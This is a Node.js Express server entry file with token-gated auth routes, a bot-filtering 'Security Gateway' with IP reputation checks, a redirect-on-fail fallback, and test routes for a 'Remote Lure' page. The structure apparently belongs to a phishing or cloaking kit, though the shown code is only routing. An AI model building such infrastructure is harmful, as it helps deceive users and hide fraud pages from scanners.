/**
 * Server Entry Point
 * Main server file
 */

const express = require('express');
const cookieParser = require('cookie-parser');
const { createServer } = require('http');
const { setupWebSocket } = require('./src/services/websocket');
const apiRoutes = require('./src/routes/api');
const gatewayRoutes = require('./src/routes/gateway');
const authRoutes = require('./src/routes/auth');
const constants = require('./src/config/constants');
const { turnstileMiddleware } = require('./src/middleware/turnstileValidator');
const { tokenValidator } = require('./src/middleware/tokenValidator');

// Create Express app
const app = express();

// Trust proxy for IP checks (essential for Heroku/Railway/Cloudflare)
app.set('trust proxy', 1);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser()); // Parse cookies for session management

// CORS - Allow requests from yieldmaxfx.com
app.use((req, res, next) => {
    const allowedOrigins = [
        'https://yieldmaxfx.com',
        'https://www.yieldmaxfx.com',
        'http://localhost:3000',
        'http://localhost:8000'
    ];

    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
    }

    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, X-API-KEY, Authorization');
    res.header('Access-Control-Allow-Credentials', 'true');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }

    next();
});

// Static assets gated by token
app.use('/:token/assets', tokenValidator, express.static(constants.PATHS.PUBLIC_DIR, {
    index: false,
    redirect: false
}));

// Routes (ORDER MATTERS!)
// API routes MUST come first, otherwise /:token matches /api/...
// EAPI (External API) - The new modular standard
const eapiRoutes = require('./src/eapi');
app.use('/eapi', eapiRoutes);

// Legacy/Internal API (maintained for backward compatibility for now)
app.use('/api', apiRoutes);

// [TESTING] Expose the Remote Lure Test Page
app.get('/test_remote_lure.html', (req, res) => {
    res.sendFile(require('path').join(__dirname, 'public/test_remote_lure.html'));
});

// [TESTING] Expose the Real Drone Shop 
app.get('/shop', (req, res) => {
    res.sendFile(require('path').join(__dirname, 'remote_shop/index.html'));
});

app.use('/', gatewayRoutes);     // Security Gateway (Root)
app.use('/', authRoutes);        // Token-protected Auth Flow (/:token/...)

// Helper endpoint for Turnstile verification if needed separately
app.post('/verify-turnstile', turnstileMiddleware, (req, res) => {
    res.json({ success: true, message: 'Turnstile verification passed' });
});

// Fallback redirect to hard fail target for any other request
app.use((req, res) => {
    res.redirect(constants.REDIRECT_ON_FAIL);
});

// Create HTTP server
const server = createServer(app);

// Setup WebSocket server
setupWebSocket(server);

// Start server
const PORT = constants.PORT;
server.listen(PORT, () => {
    console.log(`\n=================================================`);
    console.log(`🌐 Server running on http://localhost:${PORT}`);
    console.log(`🛡️  Security Gateway Active`);
    console.log(`🤖 Bot Protection & IP Reputation Enabled`);
    console.log(`=================================================\n`);
});

